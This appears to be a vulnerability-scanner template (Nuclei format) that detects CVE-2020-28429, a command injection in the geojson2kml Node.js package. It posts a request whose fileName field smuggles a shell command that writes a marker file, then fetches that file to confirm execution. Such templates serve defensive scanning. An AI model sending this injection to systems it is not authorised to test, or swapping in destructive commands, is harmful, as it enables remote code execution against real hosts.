http:
- matchers:
  - part: body_2
    type: word
    words:
    - '{{randstr}}'
  - part: header_2
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - "POST /convert HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json\n\n\
    {\n  \"fileName\": \"& echo \\\"{{randstr}}\\\" > {{filename}}.txt && ls\",\n\
    \  \"geoJsonData\": {\n    \"type\": \"FeatureCollection\",\n    \"features\"\
    : [\n      {\n        \"type\": \"Feature\",\n        \"geometry\": {\n      \
    \    \"type\": \"Point\",\n          \"coordinates\": [102.0, 0.5]\n        },\n\
    \        \"properties\": {\n          \"prop0\": \"value0\"\n        }\n     \
    \ }\n    ]\n  }\n}\n"
  - 'GET /file/{{filename}}.txt HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2020-28429
info:
  author: eeche,chae1xx1os,persona-twotwo,soonghee2
  classification:
    cpe: cpe:2.3:a:geojson2kml_project:geojson2kml:*:*:*:*:*:node.js:*:*
    cve-id: CVE-2020-28429
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-78
    epss-percentile: 0.8876
    epss-score: 0.01897
  description: 'Detects command injection vulnerability by checking if `hacked.txt`
    is created and contains the expected content.

    '
  impact: 'Successful exploitation of this vulnerability could result in unauthorized
    access, remote code execution, privilege escalation

    '
  metadata:
    framework: node.js
    max-request: 1
    product: geojson2kml
    vendor: geojson2kml_project
  name: geojson2kml - Command Injection
  reference:
  - https://snyk.io/vuln/SNYK-JS-GEOJSON2KML-1050412
  - https://github.com/advisories/GHSA-w83x-fp72-p9qc
  - https://nvd.nist.gov/vuln/detail/CVE-2020-28429
  remediation: 'Do not use geojson2kml. There is no fixed version for geojson2kml.

    '
  severity: critical
  tags: cve,cve2020,rce,geojson2kml,file-upload,intrusive
variables:
  filename: '{{rand_base(6)}}'
